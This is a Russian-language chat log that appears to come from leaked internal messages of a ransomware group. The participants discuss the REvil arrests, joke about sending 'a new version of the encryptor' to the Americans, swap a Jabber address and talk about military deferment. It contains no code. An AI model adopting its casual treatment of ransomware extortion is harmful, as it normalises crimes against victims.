[21.02.22 13:57:49] basil:		Дейсвительно надеюсь
[21.02.22 13:58:28] basil:		Я думаю что с ревилами там как то через банковскую систему на них вышли (ну или кто-то сдал)
[21.02.22 13:59:05] basil:		ВВП с Байденом переговорил. Вова решил сделать жест доброй воли - и показать как они борются
[21.02.22 13:59:30] basil:		А Амерский товарищь решил - что так и должно быть
[21.02.22 13:59:57] basil:		т.е. "молодцы" продолжайте дальше
[21.02.22 14:00:39] basil:		Ну а теперь ничего этим товарищам из-за океана не отвалится
[21.02.22 14:00:48] basil:		Мне почему то так кажется
[21.02.22 14:03:47] elroy:		Отвалится им новая версия шифровальщика))
[21.02.22 14:03:57] basil:		)))))
[21.02.22 14:04:18] basil:		У меня стекла от смеха вылетели. Умеешь шутить)))
[21.02.22 14:04:40] elroy:		Свеженькая)
[21.02.22 14:04:59] basil:		Ладно. Хотел бы обменяться контактами
[21.02.22 14:05:14] basil:		qTox используешь?
[21.02.22 14:05:36] elroy:		Зарегай жабу на thesecure.biz, прям из пси регается и скинь мне и Францу
[21.02.22 14:06:02] basil:		ок. момент
[21.02.22 14:22:41] basil:		тест
[21.02.22 14:22:49] basil:		gert52458@thesecure.biz
[21.02.22 14:23:13] basil:		а вдруг получится и мы победим
[21.02.22 14:23:15] basil:		))
[21.02.22 14:23:22] basil:		Будем надеятся на лучшее
[21.02.22 14:26:18] basil:		мне твой можно как-то записать?
[21.02.22 14:28:47] elroy:		Я позже зарегаю, добавлю. На днях. Не теряйся оттуда
[21.02.22 14:29:20] basil:		Как скажешь. Не бросай меня шеф. Совсем податься некуда
[21.02.22 14:29:22] basil:		(((
[21.02.22 14:29:44] elroy:		А ты не работаешь?
[21.02.22 14:30:44] basil:		Да там осталось 0,25 копейки совсем. Но бросить ссейчас официалку сложно. Там бронь "на войну"
[21.02.22 14:30:48] basil:		Сам понимаешь
[21.02.22 14:30:57] elroy:		))
[21.02.22 14:30:57] basil:		0,25 ставки
[21.02.22 14:31:23] basil:		Не сложно , скорее опасно
[21.02.22 14:31:49] elroy:		бронь "на войну", это в смысле занять лучшие места перед началом мобилизации?
Я просто слышал мысль, что грядет третья мировая..
[21.02.22 14:32:34] basil:		Нет это на оборот, не забирают
[21.02.22 14:32:56] basil:		т.е. если начинаются боевые действия - то ты сидишь на месте
[21.02.22 14:33:05] basil:		Это хорошо. Плохо что копейки
[21.02.22 14:33:56] basil:		А хотя пацаны ну очень многога
[21.02.22 14:34:16] basil:		практически за 5 миллионов рублей - нагнуть интеренет
[21.02.22 14:34:43] elroy:		Раньше как-то рассуждали с товарищем, что забивать на службу нельзя... Ведь если просто не явиться в военкомат, то война от этого мимом не пройдет, вопрос лишь в том где окажимся мы, в казарме с пайком или в палатке возле разбитого дома.....
[21.02.22 14:35:22] elroy:		*мимо мировая
[21.02.22 14:35:33] basil:		Да. Есть такое
[21.02.22 14:35:38] basil:		к сожалению
